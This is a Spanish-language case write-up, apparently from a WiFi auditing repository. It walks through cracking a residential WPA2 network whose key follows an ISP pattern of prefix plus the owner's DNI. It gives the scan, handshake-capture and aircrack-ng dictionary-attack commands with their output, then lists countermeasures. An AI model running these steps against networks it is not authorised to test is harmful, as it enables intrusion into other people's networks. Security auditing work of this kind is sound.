Caso Real: Red con Clave Basada en DNI del Titular
==================================================

Escenario
---------

Red WiFi detectada en un entorno residencial (departamento en Bahía Blanca).  
Nombre de red (ESSID): `ISPWiFiXXXX24GHz`  
BSSID: `XX:AD:XX:02:XX:EE`  
Canal: `11`  
Encriptación: `WPA2-PSK (CCMP)`

Capturada desde equipo propio en pruebas de alcance (no se compromete tráfico ni navegación).

Etapa 1 — Escaneo
-----------------

Comando:

`scripts/escaneo_redes.sh`

Salida relevante:

- BSSID: `XX:AD:XX:02:XX:EE` 
- ESSID: `ISPWiFiXXXX24GHz` 
- Canal: `11`
- Señal: `-33 dBm`
- Clientes activos: 2 detectados

Etapa 2 — Captura de handshake
------------------------------

Comando:

`scripts/captura_individual.sh wlan0 XX:AD:XX:02:XX:EE 11 "ISPWiFiXXXX24GHz" 90`

```bash
Handshake capturado exitosamente.  
Archivo generado:  
`scripts/output/handshake_ISPWiFiXXXX24GHz_20250723_135300.cap`
```

Etapa 3 — Verificación
----------------------

Comando:

`scripts/verificar_handshakes.sh`

Resultado:

```bash
- ✅ Handshake encontrado en handshake_ISPWiFiXXXX24GHz_20250723_135300.cap
```

Etapa 4 — Ataque por diccionario
--------------------------------

Comando:

`aircrack-ng -a2 -w diccionarios/output/diccionario_isp.txt -b XX:AD:XX:02:XX:EE scripts/output/handshake_ISPWiFiXXXX24GHz_20250723_135300.cap`

Resultado:

```bash
- ✅ Contraseña encontrada: `XXXXXXX83`
- Tiempo: **12 segundos**
- Velocidad: ~68.400 claves por segundo
```

Conclusión
----------

El ataque fue exitoso utilizando un diccionario basado en patrones conocidos de ISP (prefijo + DNI).  
La contraseña encontrada coincide con el patrón, mostrando que la red era vulnerable a ataques por diccionario específicos.

Contramedidas recomendadas
--------------------------

- Cambiar la clave del router por una contraseña robusta aleatoria.
- Deshabilitar WPS.
- Activar notificaciones de conexión sospechosa (si el router lo permite).
- Auditar redes domésticas periódicamente con herramientas como las incluidas en este repositorio.
